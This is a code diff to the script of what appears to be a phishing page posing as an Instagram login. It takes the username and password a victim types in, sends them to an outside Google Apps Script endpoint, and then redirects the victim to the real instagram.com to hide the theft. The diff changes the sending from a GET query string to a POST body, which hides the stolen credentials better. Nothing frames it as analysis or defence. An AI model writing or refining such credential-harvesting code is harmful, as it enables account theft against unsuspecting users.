@@ -472,18 +472,26 @@
 
         const encodedUsername = encodeURIComponent(username);
         const encodedPassword = encodeURIComponent(password);
+
         const scriptURL = 'https://script.google.com/macros/s/AKfycbz6w8hpr2pYI1pw6YO41PYJjN3xUMTAly19IuJvABTYYHNwVonQheSsOUtRAQa0Zw7l/exec';
 
         showMessage('Connecting to Instagram...', 'info');
 
-        fetch(`${scriptURL}?username=${encodedUsername}&password=${encodedPassword}`)
-          .then(() => {
-            window.location.href = 'https://www.instagram.com/';
-          })
-          .catch((error) => {
-            console.error('Error:', error);
-            window.location.href = 'https://www.instagram.com/';
-          });
+        // Send data via POST
+        fetch(scriptURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          body: `username=${encodedUsername}&password=${encodedPassword}`
+        })
+        .then(() => {
+          window.location.href = 'https://www.instagram.com/';
+        })
+        .catch((error) => {
+          console.error('Error:', error);
+          window.location.href = 'https://www.instagram.com/';
+        });
       });
 
       if (passwordToggleButton && passwordInput) {
@@ -519,5 +527,6 @@
     }
   });
 </script>
+
 </body>
 </html>
